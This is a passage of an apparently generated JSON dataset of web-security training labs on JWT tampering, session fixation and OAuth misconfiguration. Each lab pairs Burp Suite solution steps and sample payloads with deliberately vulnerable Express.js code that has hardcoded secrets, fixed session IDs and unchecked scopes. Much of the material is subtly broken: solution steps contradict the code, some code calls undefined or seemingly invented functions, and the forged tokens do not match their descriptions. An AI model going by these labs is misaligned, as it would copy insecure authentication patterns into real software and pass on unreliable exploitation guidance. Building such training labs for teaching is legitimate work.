    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst users = [{ username: 'user', password: 'password123' }];\napp.use(express.json());\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  const token = jwt.sign({ user: username }, 'secretkey');\n  res.json({ token });\n});\napp.post('/account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  jwt.verify(token, 'secretkey', (err, decoded) => {\n    if (err) return res.status(401).send('Unauthorized');\n    res.send(`Welcome, ${decoded.user}`);\n  });\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "Bearer <tampered_jwt_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via URL parameter",
    "Lab Description": "The application allows session fixation attacks through URL parameters. By manipulating the session ID, you can hijack another user's session. To solve the lab, fix the session ID to another user's value and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture a valid session ID by logging in with your own account and inspecting the Set-Cookie header in the response.",
      "2. Log out of the application and intercept the logout request using Burp Suite.",
      "3. Modify the session ID in the request URL to match the valid session ID you captured earlier.",
      "4. Send the modified request to the server and observe the response. The server should return the session for the previous user, not yours.",
      "5. Access the account page using the hijacked session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst users = [{ username: 'user1', password: 'password123' }, { username: 'admin', password: 'admin123' }];\nlet sessions = {};\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  const sessionId = `${user.username}-session`;\n  sessions[sessionId] = username;\n  res.cookie('sessionId', sessionId);\n  res.send('Logged in');\n});\napp.post('/logout', (req, res) => {\n  const sessionId = req.cookies['sessionId'];\n  delete sessions[sessionId];\n  res.send('Logged out');\n});\napp.get('/account', (req, res) => {\n  const sessionId = req.cookies['sessionId'];\n  if (!sessions[sessionId]) return res.status(401).send('Unauthorized');\n  res.send(`Welcome ${sessions[sessionId]}`);\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "sessionId=<fixed_session_id>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing unauthorized access",
    "Lab Description": "The application uses OAuth for authorization but is misconfigured, allowing unauthorized users to access protected resources. To solve the lab, perform an OAuth misconfiguration exploit to access Carlos's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the OAuth authorization request using Burp Suite's Proxy.",
      "2. Observe that the authorization code request does not correctly validate the 'scope' parameter, which controls access levels.",
      "3. Modify the 'scope' parameter to include an unauthorized scope value (e.g., 'admin') and resend the request.",
      "4. Obtain the authorization code from the response and exchange it for an access token.",
      "5. Use the access token to access the admin resources and solve the lab by loading Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst oauth2 = require('simple-oauth2');\nconst app = express();\nlet tokens = {};\nlet users = [{ username: 'carlos', password: 'password123' }];\napp.use(express.json());\nconst oauth2Client = oauth2.create({ client: { id: 'client_id', secret: 'client_secret' }, auth: { tokenHost: 'http://localhost:4000' } });\napp.post('/authorize', (req, res) => {\n  const { scope, code } = req.body;\n  if (scope === 'admin') {\n    const token = oauth2Client.accessToken.create({ access_token: 'valid_token' });\n    tokens[code] = token;\n    res.json({ token: token.access_token });\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\napp.get('/account', (req, res) => {\n  const { access_token } = req.query;\n  if (tokens[access_token]) {\n    res.send(`Welcome Carlos with token ${access_token}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "Authorization Code: <misconfigured_oauth_code>",
      "Access Token: <unauthorized_access_token>"
    ]
  },
  {
    "Lab scenario": "JWT Token Tampering",
    "Lab Description": "In this lab, the application's JWT authentication system has weak implementation. The JWT is signed using a weak algorithm, allowing the token to be tampered with. To solve the lab, tamper with the JWT token to escalate privileges and access a restricted user account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the authentication request and capture the JWT token.",
      "2. Examine the JWT structure to identify its algorithm and key. Decode the token using an online JWT decoder.",
      "3. Identify the payload and modify the user role from 'user' to 'admin'. Re-encode the token with the same header and payload but use a new, valid signature.",
      "4. Replace the original token with the tampered token in the Authorization header and send the modified request.",
      "5. Verify that you have gained admin access by navigating to the admin panel or viewing restricted data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst secretKey = 'supersecretkey';\nconst users = [{ username: 'user1', password: 'password123', role: 'user' }, { username: 'admin', password: 'adminpassword', role: 'admin' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { algorithm: 'HS256', expiresIn: '1h' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token) return res.status(403).send('No token provided');\n  jwt.verify(token, secretKey, (err, decoded) => {\n    if (err || decoded.role !== 'admin') return res.status(403).send('Forbidden');\n    res.send('Welcome Admin!');\n  });\n});\nconst PORT = 3000;\napp.listen(PORT, () => { console.log(`JWT Tampering Lab running on http://localhost:${PORT}`); });",
    "payloads": [
      "eyJhbGciOiAiSFMyNTYiLCJraWQiOiAiY2xpZW50X2lkIiwgInN1YiI6ICJ1c2VyMSIsICJyb2xlIjogImFkbWluIn0=.eyJpdiI6ICJjb250ZXh0ZWRfcm9sZXMiLCAiYWRtaW4iOiAiYWRtaW5fYXV0aGVudGljYXRlIiB9"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration and Token Hijacking",
    "Lab Description": "The application implements OAuth for user authentication but has a misconfigured token exchange endpoint. By exploiting the misconfiguration, you can hijack an access token from another user and access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth token request and capture the authorization code.",
      "2. Analyze the OAuth token endpoint and notice that there is a lack of proper state validation or session binding.",
      "3. Use the captured authorization code to request an access token for yourself, but modify the request to swap the client ID with that of another user.",
      "4. Use the hijacked token to access the victim's account by sending the token in the Authorization header in subsequent requests.",
      "5. Verify access to the victim's account by navigating to their profile or restricted data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\napp.use(express.json());\nconst oauthClients = { 'client1': 'clientsecret1', 'client2': 'clientsecret2' };\nconst tokens = {}; // Insecure storage of tokens\napp.post('/oauth/token', (req, res) => {\n  const { code, client_id } = req.body;\n  if (!oauthClients[client_id]) {\n    return res.status(400).send('Invalid client');\n  }\n  // Issue token based on code\n  const accessToken = 'access_token_for_' + client_id + '_user';\n  tokens[client_id] = accessToken;\n  res.json({ access_token: accessToken });\n});\napp.get('/user', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token || !Object.values(tokens).includes(token)) {\n    return res.status(401).send('Unauthorized');\n  }\n  res.send('User data');\n});\nconst PORT = 3000;\napp.listen(PORT, () => { console.log(`OAuth Misconfiguration Lab running on http://localhost:${PORT}`); });",
    "payloads": [
      "client_id=client2&code=xyz123&client_secret=clientsecret2"
    ]
  },
  {
    "Lab scenario": "Session Fixation Vulnerability",
    "Lab Description": "This lab demonstrates a session fixation vulnerability where the application accepts a session ID passed in the URL. By setting the session ID before login, you can hijack a user's session after they log in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to the application and notice the session ID being set in the URL as a query parameter.",
      "2. Log out of your account.",
      "3. Manually set the session ID in the URL to match an active session ID that corresponds to a valid user.",
      "4. Log in with valid credentials while keeping the session ID fixed in the URL.",
      "5. Access the other user's account page and verify the session hijack is successful."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'secret', resave: true, saveUninitialized: true }));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user' && password === 'password') {\n    req.session.user = username;\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.user) {\n    res.send('Account page for ' + req.session.user);\n  } else {\n    res.send('Please log in');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => { console.log(`Session Fixation Lab running on http://localhost:${PORT}`); });",
    "payloads": [
      "session_id=abcdef12345"
    ]
  },

  {
    "Lab scenario": "JWT token manipulation for unauthorized access",
    "Lab Description": "In this lab, the JWT token used for authenticating a user can be manipulated, allowing unauthorized access to protected routes. The token has insufficient validation checks, allowing attackers to alter user roles and gain elevated privileges. To solve this lab, gain access to Carlos's admin account by manipulating the JWT token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the authentication request using Burp Suite and observe the JWT token in the response headers.",
      "2. Identify the structure of the JWT token and locate the payload section containing the user role.",
      "3. Craft a new JWT token where the user role is changed to 'admin'. Base64-encode the modified payload and sign the new token using the same key as the original.",
      "4. Replace the old JWT token with the new one in the subsequent request to access protected routes.",
      "5. Upon successfully receiving admin privileges, access Carlos's admin dashboard to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secretKey = 'mysecret'; const users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, secretKey); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('Access denied'); jwt.verify(token, secretKey, (err, decoded) => { if (err) return res.status(403).send('Access denied'); if (decoded.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to the admin panel'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "Session fixation vulnerability",
    "Lab Description": "This lab demonstrates a session fixation vulnerability where the attacker can hijack the session of another user. To solve this lab, fix the session ID to a known value, then log in as Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. With Burp Suite running, intercept the request when logging into your account and take note of the session ID returned.",
      "2. Manually set the session cookie to a fixed value before sending the login request, ensuring it matches the session ID you obtained earlier.",
      "3. Use the fixed session ID to log into Carlos's account.",
      "4. After successful login, access Carlos's account page and complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123', session: 'abcd1234' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('session', user.session); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = users.find(u => u.session === session); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "OAuth misconfiguration leading to unauthorized access",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where the authorization code can be intercepted and reused by an attacker, allowing them to impersonate another user. To solve this lab, intercept and reuse the authorization code to access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth authorization request using Burp Suite and capture the authorization code in the response.",
      "2. Modify the authorization code to use a different redirect URI controlled by the attacker, ensuring that the authorization code will be sent to the attacker's server.",
      "3. Exchange the intercepted authorization code for an access token by sending a POST request to the OAuth token endpoint with the authorization code.",
      "4. Use the access token to send authenticated requests and impersonate Carlos, accessing his protected account page.",
      "5. Verify that you have gained unauthorized access to Carlos's account to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthClientId = 'client123'; const oauthClientSecret = 'secret123'; let authorizationCode = 'abcd1234'; let accessToken = ''; app.get('/authorize', (req, res) => { const { code } = req.query; if (code === authorizationCode) { res.redirect(`http://localhost:4000/callback?code=${authorizationCode}`); } else { res.status(400).send('Invalid code'); } }); app.post('/token', (req, res) => { const { code } = req.body; if (code === authorizationCode) { accessToken = 'access_token_1234'; res.json({ access_token: accessToken }); } else { res.status(400).send('Invalid code'); } }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (token === accessToken) { res.send('Welcome Carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "JWT Token Manipulation in Authorization Flow",
    "Lab Description": "The application utilizes JWT for authorization but improperly validates the token signature, allowing for manipulation. The goal is to tamper with the JWT token and access a restricted resource that should otherwise be protected.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the request where the JWT token is sent to the server for authorization using Burp Suite.",
      "2. Decode the JWT token using a tool like jwt.io and observe the payload.",
      "3. Modify the payload to escalate user privileges or change user roles, while ensuring the token signature remains valid.",
      "4. Re-encrypt the modified JWT token and send it back to the server in the Authorization header.",
      "5. Confirm if the modified token successfully bypasses the authorization and allows access to restricted resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'supersecret'; const users = [{ username: 'admin', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secretKey); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('No token provided'); jwt.verify(token, secretKey, (err, decoded) => { if (err) return res.status(403).send('Failed to authenticate token'); if (decoded.role === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('Forbidden'); } }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.eyJrZ44rt6kYXLItD5qIuw1JQ_a7hvvLfY7jAY-Jdft4oO9kMnsrtV5-5V0FQKxyw9ihpR0B5XjBze_DbfQWr5-M0aNNUuSc_-I56oD6Q8xADwlWb93YPrDA==",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.INVALID_SIGNATURE"
    ]
  },
  {
    "Lab scenario": "Session Fixation Attack via Cookie Manipulation",
    "Lab Description": "The application is vulnerable to session fixation attacks due to improper handling of session cookies. The goal is to hijack an existing session or fixate a session to gain unauthorized access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the request using Burp Suite and observe how the session cookie is assigned during login.",
      "2. Attempt to set the session cookie value manually before logging in by using a fixed value.",
      "3. Log in with the fixed session cookie and check if the session persists even after authentication.",
      "4. Explore any accessible resources that should be restricted based on user roles and attempt to escalate privileges.",
      "5. Once access is gained, confirm successful exploitation by accessing the 'My Account' page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('session', 'fixed-session-id'); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.session === 'fixed-session-id') { res.send('Access granted'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "session=fixed-session-id",
      "session=random-session-id"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Leading to Access Token Leak",
    "Lab Description": "In this lab, the OAuth implementation is misconfigured, allowing an attacker to gain access to sensitive data by intercepting an access token. The goal is to retrieve the access token and use it to impersonate a user.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Launch a phishing attack to redirect the user to the authorization server and obtain the authorization code.",
      "2. Intercept the authorization code response using Burp Suite.",
      "3. Exchange the authorization code for an access token by sending a request to the token endpoint.",
      "4. Use the access token to impersonate the user and access protected resources.",
      "5. Verify the access control breach by accessing user-sensitive data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; const clientId = 'client-id'; const clientSecret = 'client-secret'; const authCode = 'authorization-code'; const accessToken = 'access-token'; app.get('/auth', (req, res) => { res.redirect('https://authorization-server.com?response_type=code&client_id=' + clientId + '&redirect_uri=http://localhost:4000/callback'); }); app.get('/callback', (req, res) => { const code = req.query.code; if (code === authCode) { res.json({ access_token: accessToken }); } }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer ' + accessToken) { res.send('User profile data'); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
    "payloads": [
      "authorization_code=authorization-code",
      "access_token=access-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation Attack in RESTful API",
    "Lab Description": "The application suffers from a session fixation vulnerability. An attacker can set a valid session cookie before the victim logs in, allowing them to hijack the victim’s session once authenticated. To solve the lab, you must exploit this flaw to take control of Carlos's session after they log in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite's Proxy to intercept the login request and capture the session cookie. Manually set the session cookie to a fixed value before the victim logs in.",
      "2. With the fixed session cookie, send the login request for Carlos's account while observing the session cookie value.",
      "3. Upon successful login, confirm the cookie remains the same, ensuring it’s the fixed one.",
      "4. Verify that after Carlos logs in with the fixed session ID, you can access their account page and interact with their session.",
      "5. Clean up by logging out and ensuring no session is hijacked."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst users = [{ username: 'carlos', password: 'password123', session: 'abcd1234' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) { return res.status(401).send('Invalid credentials'); }\n  res.cookie('session', 'fixed-session-id');\n  res.send('Logged in');\n});\napp.get('/account', (req, res) => {\n  const session = req.cookies.session;\n  const user = users.find(u => u.session === session);\n  if (user) { res.send(`Welcome ${user.username}`); } else { res.send('Access denied'); }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running'));"
  },
  {
    "Lab scenario": "JWT Manipulation via Tampering",
    "Lab Description": "The application uses JWTs for authentication but the JWT payload is not validated properly. An attacker can manipulate the payload and alter their role to gain unauthorized access to an admin panel. To solve this lab, you must modify the JWT token to impersonate the admin and access restricted resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture the login request and identify the JWT token being sent in the Authorization header.",
      "2. Decode the JWT token using a tool like jwt.io to reveal the header, payload, and signature.",
      "3. Modify the payload to change the user's role from 'user' to 'admin'. Use a simple online tool to modify the base64-encoded payload.",
      "4. Re-sign the modified token with the same secret key (which can be guessed using a brute-force attack or known based on the application's behavior).",
      "5. Send the modified token back in the Authorization header of a request to access the admin panel and verify the successful exploitation.",
      "6. Clean up by logging out and ensuring no further admin access is possible without re-authentication."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'supersecretkey';\nconst users = [{ username: 'carlos', password: 'password123', role: 'user' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) { return res.status(401).send('Invalid credentials'); }\n  const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { expiresIn: '1h' });\n  res.json({ token });\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, secretKey);\n    if (decoded.role !== 'admin') { return res.status(403).send('Access denied'); }\n    res.send('Welcome Admin');\n  } catch (err) { res.status(401).send('Invalid token'); }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Manipulation Lab running'));"
  },
  {
    "Lab scenario": "OAuth Misconfiguration in GraphQL API",
    "Lab Description": "The application uses OAuth for authentication but the OAuth provider is misconfigured, allowing an attacker to impersonate any user by modifying the authorization token. To solve the lab, you must exploit this misconfiguration and access the profile of a user other than Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the OAuth token request using Burp Suite and capture the access token.",
      "2. Send the token to an OAuth introspection endpoint to view the associated user data.",
      "3. Identify the OAuth configuration flaw by inspecting the token scope or audience parameters.",
      "4. Manipulate the token to change the 'sub' (subject) claim to the username of another user, such as 'admin'.",
      "5. Use the modified token to make an authenticated request to the GraphQL API, retrieving the admin's profile or other sensitive data.",
      "6. Log out and confirm the exploit is no longer active by observing the token expiration or invalidation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { gql, ApolloServer } = require('apollo-server-express');\nconst app = express();\nlet users = [{ username: 'carlos', password: 'password123', role: 'user' }, { username: 'admin', password: 'admin123', role: 'admin' }];\nconst typeDefs = gql`\n  type Query {\n    profile: User\n  }\n  type User {\n    username: String\n    role: String\n  }\n`;\nconst resolvers = {\n  Query: {\n    profile: (parent, args, context) => {\n      return users.find(u => u.username === context.user);\n    }\n  }\n};\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  context: ({ req }) => {\n    const token = req.headers['authorization'].split(' ')[1];\n    const decoded = jwt.verify(token, 'supersecretkey');\n    return { user: decoded.username };  \n  }\n});\nserver.applyMiddleware({ app });\napp.listen(4000, () => console.log('OAuth Misconfiguration Lab running'));"
  },
  {
    "Lab scenario": "JWT Token Manipulation for Account Access",
    "Lab Description": "This lab contains an authentication vulnerability in JWT token handling. The application relies on the user's JWT token for maintaining a session. The token does not properly validate the claims inside it, allowing an attacker to manipulate the token. To solve this lab, manipulate the JWT token to escalate the user role to an admin and access Carlos's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login request and capture the JWT token.",
      "2. Decode the JWT token using an online tool or Burp Suite.",
      "3. Modify the 'role' claim in the token to 'admin'.",
      "4. Re-encode the token and replace the old token with the modified one in the Authorization header.",
      "5. Access the /my-account endpoint to confirm if you have elevated access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'mysecret'; let users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, secret); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, secret, (err, decoded) => { if (err) return res.status(403).send('Unauthorized'); if (decoded.role !== 'admin') return res.status(403).send('Access denied'); res.send('Account details for Carlos'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "admin:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.nK9JH9RdkmOwznEbbvXpiAB6yXsPeyDWsxT9oeZ2lGUg",
      "user:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJ1c2VyIn0.SgLsT6LgN0fYzXiMoeNl3mXwQfCPpwn4a09N8ckjFhkA"
    ]
  },
  {
    "Lab scenario": "Session Fixation Attack",
    "Lab Description": "The application improperly manages session IDs. Even though the user logs in, the session ID is not regenerated on login. An attacker can set their own session ID before the victim logs in, effectively hijacking the session. To solve this lab, perform a session fixation attack to access Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Set a custom session ID using Burp Suite or by manually modifying the session cookie in the browser.",
      "2. Have the victim log in with valid credentials while keeping the custom session ID.",
      "3. Use the session ID obtained after login to access the /my-account page.",
      "4. Validate if the session ID used belongs to the victim after accessing their account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.cookie('sessionID', '123456'); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const { sessionID } = req.cookies; if (sessionID !== '123456') return res.status(403).send('Access denied'); res.send('Account details for Carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "sessionID=custom12345",
      "sessionID=123456"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Leading to Unauthorized Access",
    "Lab Description": "This lab is vulnerable to improper OAuth configuration, which results in users being able to access other users' resources. The OAuth token request does not properly restrict access to the user's data. To solve this lab, use an OAuth token to access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start by reviewing the OAuth flow and intercept the request using Burp Suite.",
      "2. Inspect the scope parameter in the OAuth authorization request and identify that it grants access to other users' data.",
      "3. Use the authorization code obtained to generate an access token for Carlos's account.",
      "4. Send the access token in the Authorization header to gain access to Carlos's account page.",
      "5. Confirm that unauthorized access is granted to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const oauth = require('oauth2-server'); const app = express(); let users = [{ username: 'carlos', password: 'password123', id: 1 }]; const oauthServer = new oauth.Server(); app.post('/token', (req, res) => { const { code } = req.body; const token = oauthServer.exchange({ code }); res.json({ access_token: token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; oauthServer.authenticate({ access_token: token }, (err, user) => { if (err) return res.status(403).send('Access denied'); res.send(`Account details for ${user.username}`); }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
    "payloads": [
      "access_token=valid-oauth-token-for-carlos",
      "access_token=invalid-oauth-token"
    ]
  },
  {
    "Lab scenario": "JWT token tampering with admin access",
    "Lab Description": "In this lab, a vulnerable JWT-based authentication mechanism is present. The application uses JWT tokens for access control, but the secret key is weak and can be guessed. To solve the lab, the JWT token needs to be tampered with to elevate the user's privileges and access the admin page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture the JWT token from the 'Authorization' header using Burp Suite's Proxy.",
      "2. Decrypt the JWT token using a base64 decoding tool to retrieve the payload.",
      "3. Modify the payload to change the 'role' field from 'user' to 'admin'.",
      "4. Re-encode the modified payload and create a new JWT token.",
      "5. Send the modified JWT token in the 'Authorization' header of a request to the server using Burp Suite's Repeater.",
      "6. If the server responds with admin access, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst secretKey = 'weakSecret';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user' && password === 'password123') {\n    const token = jwt.sign({ username: 'user', role: 'user' }, secretKey, { expiresIn: '1h' });\n    return res.json({ token });\n  }\n  return res.status(401).json({ error: 'Invalid credentials' });\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token) return res.status(401).json({ error: 'No token provided' });\n  jwt.verify(token, secretKey, (err, decoded) => {\n    if (err) return res.status(401).json({ error: 'Invalid token' });\n    if (decoded.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });\n    res.send('Welcome to the admin panel');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTYzMzMyMDR9.9G53KDmcuhgfXz1xF2ZIiStZWZTtIHUSuC9NOhOdR4Y",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTYzMzMyMDR9.9G53KDmcuhgfXz1xF2ZIiStZWZTtIHUSuC9NOhOdR4Y"
    ]
  },
  {
    "Lab scenario": "Session fixation attack with session hijacking",
    "Lab Description": "The application is vulnerable to a session fixation attack, where the attacker can set a session ID before the user logs in. By exploiting this vulnerability, the attacker can hijack a user's session. To solve the lab, exploit the session fixation flaw and gain access to the victim's account.",
